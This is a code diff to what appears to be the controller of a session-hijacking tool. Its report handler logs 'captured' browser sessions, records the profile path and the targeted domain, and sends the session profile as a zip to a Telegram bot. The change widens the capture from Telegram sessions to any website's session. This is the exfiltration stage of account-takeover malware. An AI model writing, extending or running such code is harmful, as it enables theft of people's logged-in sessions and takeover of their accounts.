@@ -245,20 +245,23 @@ def report():
     session = sessions[session_id]
     session["last_activity"] = timestamp
     
-    # Handle Telegram session capture
-    if report_type == "telegram_session":
+    # Handle web session capture
+    if report_type == "web_session":
         profile_path = report_data.get("profile_path", "")
+        domain = report_data.get("domain", "unknown")
         print(f"[Controller] Session captured: {session_id}", flush=True)
+        print(f"[Controller] Domain: {domain}", flush=True)
         print(f"[Controller] Profile: {profile_path}", flush=True)
         
         session["status"] = "captured"
+        session["domain"] = domain
         session["profile_path"] = profile_path
         
         # Send session zip to Telegram
         if profile_path:
             print(f"[Controller] Sending session...", flush=True)
             try:
-                result = bot.send_session(session_id, profile_path)
+                result = bot.send_session(session_id, profile_path, domain)
                 print(f"[Controller] Session sent: {result}", flush=True)
             except Exception as e:
                 print(f"[Controller] Error: {e}", flush=True)
